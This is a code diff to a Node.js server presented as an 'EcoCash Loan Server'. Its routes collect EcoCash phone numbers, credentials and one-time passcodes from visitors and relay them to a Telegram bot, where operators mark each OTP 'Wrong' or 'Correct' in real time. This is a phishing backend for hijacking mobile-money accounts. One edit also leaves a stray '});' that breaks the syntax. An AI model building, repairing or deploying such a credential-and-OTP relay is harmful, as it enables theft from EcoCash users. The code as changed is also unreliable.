@@ -33,7 +33,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     const data = req.body;
     const formattedPhone = formatZimbabwePhone(data.phone);
     
-    // Validate EcoCash prefixes (e.g. 77, 78 for Econet/EcoCash)
+    // Validate EcoCash prefixes (+263 77 / +263 78)
     if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
       return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
     }
@@ -79,7 +79,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered to bot
+// STEP 3 SUBMISSION: OTP delivered to bot with inline buttons
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -107,14 +107,14 @@ app.post('/api/submit-otp', async (req, res) => {
         chat_id: chatId,
         text: messageText,
         parse_mode: 'HTML',
-        reply_markup: {
+        reply_markup: JSON.stringify({
           inline_keyboard: [
             [
               { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
               { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
             ]
           ]
-        }
+        })
       };
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -143,12 +143,11 @@ app.get('/api/check-status/:appReference', (req, res) => {
   res.json({ success: true, status: appData.status });
 });
 
-// Telegram Webhook Handler (Includes /start command for personal info & button actions)
+// Telegram Webhook Handler (/start command + callback buttons)
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
 
-  // Handle /start command sending personal info
   if (req.body.message && req.body.message.text) {
     const text = req.body.message.text.trim();
     const chatId = req.body.message.chat.id;
@@ -207,7 +206,7 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   } catch (err) {
     console.error("Telegram edit error:", err.message);
   }
-}
+});
 
 app.get('*', (req, res) => {
   res.sendFile(path.join(publicPath, 'index.html'));
@@ -216,3 +215,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
+      
